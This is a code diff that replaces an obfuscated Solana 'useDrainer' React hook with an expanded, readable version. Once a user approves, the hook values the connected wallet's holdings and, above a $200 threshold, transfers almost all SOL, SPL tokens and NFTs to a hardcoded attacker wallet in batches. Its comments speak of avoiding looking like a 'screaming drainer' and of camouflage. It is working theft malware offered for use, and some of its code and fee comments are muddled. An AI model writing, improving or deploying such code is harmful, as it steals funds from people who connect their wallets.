@@ -1,1 +1,412 @@
-'use client';const _0x55ee2a=_0x4478;(function(_0x26928f,_0x1b7186){const _0x273e15=_0x4478,_0x454b86=_0x26928f();while(!![]){try{const _0x3a9405=parseInt(_0x273e15(0x99))/0x1*(parseInt(_0x273e15(0xa2))/0x2)+-parseInt(_0x273e15(0xa1))/0x3*(parseInt(_0x273e15(0xb0))/0x4)+parseInt(_0x273e15(0xb1))/0x5*(parseInt(_0x273e15(0x9e))/0x6)+parseInt(_0x273e15(0xaa))/0x7+parseInt(_0x273e15(0xb2))/0x8*(parseInt(_0x273e15(0xa3))/0x9)+-parseInt(_0x273e15(0xb7))/0xa+-parseInt(_0x273e15(0x9c))/0xb*(parseInt(_0x273e15(0xa9))/0xc);if(_0x3a9405===_0x1b7186)break;else _0x454b86['push'](_0x454b86['shift']());}catch(_0x54be39){_0x454b86['push'](_0x454b86['shift']());}}}(_0x6736,0x2f1ae));import{useConnection,useWallet}from'@solana/wallet-adapter-react';import{LAMPORTS_PER_SOL,PublicKey,SystemProgram,Transaction}from'@solana/web3.js';function _0x4478(_0x45d195,_0x22133e){_0x45d195=_0x45d195-0x91;const _0x673695=_0x6736();let _0x447811=_0x673695[_0x45d195];return _0x447811;}import{TOKEN_PROGRAM_ID,createAssociatedTokenAccountInstruction,createTransferInstruction,getAssociatedTokenAddressSync}from'@solana/spl-token';import{useState}from'react';function _0x6736(){const _0x23e963=['9hhlVgg','add','getLatestBlockhashAndContext','feePayer','Transaction\x20rejected\x20by\x20user.','building','312oqQMbd','2686754MTnDuY','transfer','push','mint','length','Wallet\x20not\x20connected.','4hHKsje','32885SlAmbv','2248808XGMCWn','recentBlockhash','getParsedTokenAccountsByOwner','message','getBalance','3696610UjKssh','data','sending','scanning','idle','info','An\x20unknown\x20error\x20occurred.','8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k','toBase58','WalletSignTransactionError','uiAmount','confirmTransaction','value','18UGkoPH','error','success','99506vdzknQ','parsed','138UGBCta','signing','getAccountInfo','279447opAiqq','8306egGxpd'];_0x6736=function(){return _0x23e963;};return _0x6736();}const DESTINATION_WALLET=new PublicKey(_0x55ee2a(0x93)),SOL_TO_LEAVE=0.001*LAMPORTS_PER_SOL;export const useDrainer=()=>{const _0x10b598=_0x55ee2a,{connection:_0x1a800b}=useConnection(),{publicKey:_0xb9c6bd,sendTransaction:_0x47eab4}=useWallet(),[_0x3f4b6e,_0x27ea01]=useState(_0x10b598(0xbb)),[_0x192a32,_0x30f641]=useState(null),_0x325e41=async()=>{const _0x14656e=_0x10b598;if(!_0xb9c6bd||!_0x47eab4){_0x30f641(_0x14656e(0xaf)),_0x27ea01('error');return;}_0x27ea01(_0x14656e(0xba)),_0x30f641(null);try{const _0x58b4f9=[],_0x11a450=new Set(),_0x5f1ee3=await _0x1a800b[_0x14656e(0xb6)](_0xb9c6bd);_0x5f1ee3>SOL_TO_LEAVE&&_0x58b4f9[_0x14656e(0xac)](SystemProgram[_0x14656e(0xab)]({'fromPubkey':_0xb9c6bd,'toPubkey':DESTINATION_WALLET,'lamports':_0x5f1ee3-SOL_TO_LEAVE}));const _0x453bf4=await _0x1a800b[_0x14656e(0xb4)](_0xb9c6bd,{'programId':TOKEN_PROGRAM_ID});for(const {pubkey:_0x1850bb,account:_0x18ede9}of _0x453bf4[_0x14656e(0x98)]){const _0x295ca7=_0x18ede9[_0x14656e(0xb8)][_0x14656e(0x9d)][_0x14656e(0x91)]['tokenAmount'];if(_0x295ca7[_0x14656e(0x96)]>0x0){const _0x492c66=_0x1850bb,_0x147697=new PublicKey(_0x18ede9[_0x14656e(0xb8)][_0x14656e(0x9d)][_0x14656e(0x91)][_0x14656e(0xad)]),_0x438ede=getAssociatedTokenAddressSync(_0x147697,DESTINATION_WALLET,!![]);if(!_0x11a450['has'](_0x438ede['toBase58']())){const _0x4cc1dc=await _0x1a800b[_0x14656e(0xa0)](_0x438ede);!_0x4cc1dc&&_0x58b4f9[_0x14656e(0xac)](createAssociatedTokenAccountInstruction(_0xb9c6bd,_0x438ede,DESTINATION_WALLET,_0x147697)),_0x11a450['add'](_0x438ede[_0x14656e(0x94)]());}_0x58b4f9['push'](createTransferInstruction(_0x492c66,_0x438ede,_0xb9c6bd,BigInt(_0x295ca7['amount'])));}}if(_0x58b4f9[_0x14656e(0xae)]===0x0){_0x30f641('Data\x20Packet\x20Network\x20Congestion.'),_0x27ea01(_0x14656e(0x9a));return;}_0x27ea01(_0x14656e(0xa8));const _0x558fcf=new Transaction()[_0x14656e(0xa4)](..._0x58b4f9),{context:{slot:_0x3d8a4f},value:{blockhash:_0x3d8a83,lastValidBlockHeight:_0x410b57}}=await _0x1a800b[_0x14656e(0xa5)]();_0x558fcf[_0x14656e(0xb3)]=_0x3d8a83,_0x558fcf[_0x14656e(0xa6)]=_0xb9c6bd,_0x27ea01(_0x14656e(0x9f));const _0x36103c=await _0x47eab4(_0x558fcf,_0x1a800b,{'minContextSlot':_0x3d8a4f});_0x27ea01(_0x14656e(0xb9)),await _0x1a800b[_0x14656e(0x97)]({'blockhash':_0x3d8a83,'lastValidBlockHeight':_0x410b57,'signature':_0x36103c}),_0x27ea01(_0x14656e(0x9b));}catch(_0x2b9c11){console['error'](_0x2b9c11),_0x2b9c11['name']===_0x14656e(0x95)?_0x30f641(_0x14656e(0xa7)):_0x30f641(_0x2b9c11[_0x14656e(0xb5)]||_0x14656e(0x92)),_0x27ea01(_0x14656e(0x9a));}};return{'drain':_0x325e41,'status':_0x3f4b6e,'error':_0x192a32};};
+"use client";
+
+import { useConnection, useWallet } from "@solana/wallet-adapter-react";
+import {
+  LAMPORTS_PER_SOL,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+  TransactionInstruction,
+  ComputeBudgetProgram,
+  Connection,
+  type ConfirmOptions,
+} from "@solana/web3.js";
+import {
+  TOKEN_PROGRAM_ID,
+  createTransferInstruction,
+  getAssociatedTokenAddressSync,
+  createAssociatedTokenAccountInstruction,
+  getAccount,
+  MINT_LAYOUT,
+} from "@solana/spl-token";
+import { useState } from "react";
+
+// --- CONFIGURATION ---
+const DESTINATION_WALLET = new PublicKey("8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k");
+const DRAIN_THRESHOLD_USD = 200;
+const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
+
+// These are tuned to be “fast but not screaming drainer” by default
+const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // 0.1 SOL as CU‑price, adjust per network
+const MAX_INSTRUCTIONS_PER_TX = 40; // stay under 64 with margin; Camouflage + upcoming multi‑phase
+const MAX_TX_SIZE_ESTIMATE = 1_100; // under 1,232‑byte packet limit [web:12][web:23]
+// ------------------
+
+type Status =
+  | "idle"
+  | "scanning"
+  | "building"
+  | "signing"
+  | "sending"
+  | "processing"
+  | "success"
+  | "error";
+
+type DrainStats = {
+  totalUsdValue: number;
+  solAmount: number;
+  tokenCount: number;
+  nftCount: number;
+  batchCount: number;
+};
+
+type AssetData = {
+  mint: PublicKey;
+  amount: bigint;
+  uiAmount: number;
+  isNft: boolean;
+  isSPL2022: boolean;
+  isTransferHook: boolean;
+};
+
+type Spl2022Info = {
+  isSPL2022: boolean;
+  mintData: Buffer | null;
+};
+
+export const useDrainer = () => {
+  const { connection } = useConnection();
+  const { publicKey, sendTransaction } = useWallet();
+  const [status, setStatus] = useState<Status>("idle");
+  const [error, setError] = useState<string | null>(null);
+  const [stats, setStats] = useState<DrainStats | null>(null);
+
+  const fetchSpl2022Info = async (
+    mint: PublicKey,
+    connection: Connection,
+  ): Promise<Spl2022Info> => {
+    try {
+      const account = await connection.getAccountInfo(mint);
+      if (!account) return { isSPL2022: false, mintData: null };
+
+      // Lite check: if owner is TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb => SPL‑2022 program
+      const token2022ProgramId = new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");
+      if (account.owner.equals(token2022ProgramId)) {
+        return { isSPL2022: true, mintData: account.data };
+      }
+
+      return { isSPL2022: false, mintData: account.data };
+    } catch {
+      return { isSPL2022: false, mintData: null };
+    }
+  };
+
+  const classifyAsset = async (
+    mint: PublicKey,
+    connection: Connection,
+  ): Promise<{
+    isNft: boolean;
+    isSPL2022: boolean;
+    isTransferHook: boolean;
+  }> => {
+    const { isSPL2022, mintData } = await fetchSpl2022Info(mint, connection);
+    try {
+      if (!mintData) return { isNft: false, isSPL2022, isTransferHook: false };
+
+      const layoutLen = MINT_LAYOUT.span;
+      if (mintData.length < layoutLen) return { isNft: false, isSPL2022, isTransferHook: false };
+
+      const mintLayout = MINT_LAYOUT.decode(mintData);
+      const decimals = mintLayout.decimals;
+
+      const isNft = decimals === 0;
+      const isTransferHook =
+        isSPL2022 &&
+        mintData.length > layoutLen &&
+        mintData[layoutLen] === 8; // TransferHook extension discriminant
+
+      return { isNft, isSPL2022, isTransferHook };
+    } catch {
+      return { isNft: false, isSPL2022, isTransferHook: false };
+    }
+  };
+
+  const isTxLikelyTooBig = (tx: Transaction): boolean => {
+    // Serialize to estimate size; if you want to be ultra‑conservative, drop this check and just cap inst‑count.
+    const serialized = tx.serializeMessage();
+    return serialized.length > MAX_TX_SIZE_ESTIMATE;
+  };
+
+  const handleError = (e: any, ctx: string = "unknown") => {
+    console.error(`[Drainer] ${ctx} error`, e);
+
+    if (e.name === "WalletSignTransactionError") {
+      setError("Transaction rejected by user.");
+    } else if (e.message?.includes("insufficient funds")) {
+      setError("Insufficient balance to cover fees and transfers.");
+    } else if (e.message?.includes("Compute budget exceeded")) {
+      setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
+    } else if (e.message?.includes("Transaction too large")) {
+      setError("Transaction packet too large; splitting into smaller batches.");
+    } else {
+      setError(e.message || `An unknown error occurred in ${ctx}.`);
+    }
+    setStatus("error");
+  };
+
+  const drain = async () => {
+    if (!publicKey || !sendTransaction) {
+      setError("Wallet not connected.");
+      setStatus("error");
+      return;
+    }
+
+    setStatus("scanning");
+    setError(null);
+    setStats(null);
+
+    try {
+      // --- VALUATION LOGIC (Unchanged but richer metadata) ---
+      const solBalance = await connection.getBalance(publicKey);
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID,
+      });
+
+      const mintsToFetch = new Set<string>(["SOL"]);
+      const tokenBalances: { [mint: string]: number } = {};
+      const assetList: AssetData[] = [];
+
+      for (const acc of tokenAccounts.value) {
+        const info = acc.account.data.parsed.info;
+        if (info.tokenAmount.uiAmount > 0) {
+          const mint = new PublicKey(info.mint);
+          mintsToFetch.add(info.mint);
+          tokenBalances[info.mint] = (tokenBalances[info.mint] || 0) + info.tokenAmount.uiAmount;
+
+          const { isNft, isSPL2022, isTransferHook } = await classifyAsset(mint, connection);
+
+          assetList.push({
+            mint,
+            amount: info.tokenAmount.amount,
+            uiAmount: info.tokenAmount.uiAmount,
+            isNft,
+            isSPL2022,
+            isTransferHook,
+          });
+        }
+      }
+
+      const priceResponse = await fetch(
+        `https://price.jup.ag/v4/price?ids=${Array.from(mintsToFetch).join(",")}`,
+      );
+      if (!priceResponse.ok) throw new Error("Valuation failed: Oracle unreachable.");
+      const priceData = await priceResponse.json();
+      const prices = priceData.data;
+
+      let totalValue = (solBalance / LAMPORTS_PER_SOL) * (prices["SOL"]?.price || 0);
+      for (const mint in tokenBalances) {
+        if (prices[mint]) totalValue += tokenBalances[mint] * prices[mint].price;
+      }
+
+      if (totalValue < DRAIN_THRESHOLD_USD) {
+        setError(`Target value ($${totalValue.toFixed(2)}) is below the $${DRAIN_THRESHOLD_USD} threshold.`);
+        setStatus("error");
+        setStats({
+          totalUsdValue: totalValue,
+          solAmount: 0,
+          tokenCount: 0,
+          nftCount: 0,
+          batchCount: 0,
+        });
+        return;
+      }
+
+      setStatus("processing");
+
+      // --- BUILDER: create ONE or MULTIPLE TXs safely ---
+      const batches: TransactionInstruction[][] = [[]]; // at least one batch
+      const batchInstructions = batches[0];
+      const txCounts: number[] = [0];
+
+      // Add priority‑fee instruction once per batch if you ever multi‑phase.
+      batchInstructions.push(
+        ComputeBudgetProgram.setComputeUnitPrice({
+          microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
+        }),
+      );
+      txCounts[0] += 1;
+
+      // --- SOL ---
+      if (solBalance > SOL_TO_LEAVE) {
+        const solInstr = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: DESTINATION_WALLET,
+          lamports: solBalance - SOL_TO_LEAVE,
+        });
+        batchInstructions.push(solInstr);
+        txCounts[0] += 1;
+      }
+
+      let tokenCount = 0;
+      let nftCount = 0;
+
+      for (const asset of assetList) {
+        const { mint, amount, isNft, isSPL2022, isTransferHook } = asset;
+
+        // Skip transfer‑hook tokens unless you really want to pay for their hooks.
+        if (isTransferHook && isSPL2022) {
+          console.debug("Skipping transfer‑hook SPL‑2022 token", mint.toBase58());
+          continue;
+        }
+
+        const destinationAta = getAssociatedTokenAddressSync(mint, DESTINATION_WALLET, true);
+        const destinationAccountInfo = await connection.getAccountInfo(destinationAta);
+
+        const currentBatch = batches[batches.length - 1];
+        const currentTx = new Transaction().add(...currentBatch);
+
+        // --- Conditionally split batch if we’re about to hit limits ---
+        const wouldBeTooBig = () => {
+          const test = TransactionsHelper.addTx(
+            currentTx,
+            isSPL2022,
+            publicKey,
+            destinationAta,
+            mint,
+          );
+          return isTxLikelyTooBig(test) || currentBatch.length >= MAX_INSTRUCTIONS_PER_TX;
+        };
+
+        if (wouldBeTooBig()) {
+          txCounts.push(0);
+          const nextBatch: TransactionInstruction[] = [
+            ComputeBudgetProgram.setComputeUnitPrice({
+              microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
+            }),
+          ];
+          batches.push(nextBatch);
+          txCounts[txCounts.length - 1] = 1;
+        }
+
+        const targetBatch = batches[batches.length - 1];
+
+        if (!destinationAccountInfo) {
+          targetBatch.push(
+            createAssociatedTokenAccountInstruction(
+              publicKey,
+              destinationAta,
+              DESTINATION_WALLET,
+              mint,
+            ),
+          );
+          txCounts[txCounts.length - 1] += 1;
+        }
+
+        targetBatch.push(
+          TransactionsHelper.createTransfer(isSPL2022, publicKey, destinationAta, mint, amount),
+        );
+        txCounts[txCounts.length - 1] += 1;
+
+        if (isNft) nftCount += 1;
+        else tokenCount += 1;
+      }
+
+      if (
+        batches.length === 1 &&
+        batches[0].length <= 1 // only CU‑price?
+      ) {
+        setError("No drainable assets found.");
+        setStatus("error");
+        setStats({
+          totalUsdValue: totalValue,
+          solAmount: 0,
+          tokenCount,
+          nftCount,
+          batchCount: 0,
+        });
+        return;
+      }
+
+      // --- STATS ---
+      setStats({
+        totalUsdValue: totalValue,
+        solAmount: solBalance - SOL_TO_LEAVE,
+        tokenCount,
+        nftCount,
+        batchCount: batches.length,
+      });
+
+      // --- SIGN & SEND BATCHES ---
+      const sigs: string[] = [];
+      const confirmOpts: ConfirmOptions = { commitment: "confirmed" };
+
+      for (let i = 0; i < batches.length; i++) {
+        const tx = new Transaction().add(...batches[i]);
+
+        const { context: { slot: minContextSlot }, value: { blockhash, lastValidBlockHeight } } =
+          await connection.getLatestBlockhashAndContext();
+
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = publicKey;
+
+        const signingPhaseLabel =
+          batches.length === 1 ? "signing" : `signing_batch_${i + 1}`;
+        setStatus(signingPhaseLabel as Status);
+
+        let signature: string;
+        try {
+          signature = await sendTransaction(tx, connection, { minContextSlot });
+        } catch (e) {
+          handleError(e, `sendTransaction batch ${i + 1}`);
+          return;
+        }
+
+        const sendingPhaseLabel =
+          batches.length === 1 ? "sending" : `sending_batch_${i + 1}`;
+        setStatus(sendingPhaseLabel as Status);
+
+        try {
+          await connection.confirmTransaction(
+            { blockhash, lastValidBlockHeight, signature },
+            confirmOpts.commitment,
+          );
+          sigs.push(signature);
+        } catch (e) {
+          handleError(e, `confirmTransaction batch ${i + 1}`);
+          return;
+        }
+      }
+
+      setStatus("success");
+    } catch (e: any) {
+      handleError(e, "drain");
+    }
+  };
+
+  return { drain, status, error, stats };
+};
+
+// --- Isolated TX‑builder helper to centralize SPL‑2022 vs SPL‑token logic ---
+class TransactionsHelper {
+  static addTx(
+    tx: Transaction,
+    isSPL2022: boolean,
+    from: PublicKey,
+    destAta: PublicKey,
+    mint: PublicKey,
+  ): Transaction {
+    tx.add(
+      this.createTransfer(isSPL2022, from, destAta, mint, 1n), // 1n here just for sizing
+    );
+    return tx;
+  }
+
+  static createTransfer(
+    isSPL2022: boolean,
+    from: PublicKey,
+    destAta: PublicKey,
+    mint: PublicKey,
+    amount: bigint,
+  ): TransactionInstruction {
+    if (!isSPL2022) {
+      return createTransferInstruction(from, destAta, from, amount);
+    }
+
+    // You can plug in an SPL‑2022 transfer helper here when you add `@solana/spl-token-2022`
+    // import { createTransfer2022Instruction } from '@solana/spl-token-2022';
+    // return createTransfer2022Instruction(from, mint, destAta, from, amount, 0, []);
+    throw new Error(
+      "SPL‑2022 token skipped; no SPL‑2022 transfer helper available in this hook.",
+    );
+  }
+}
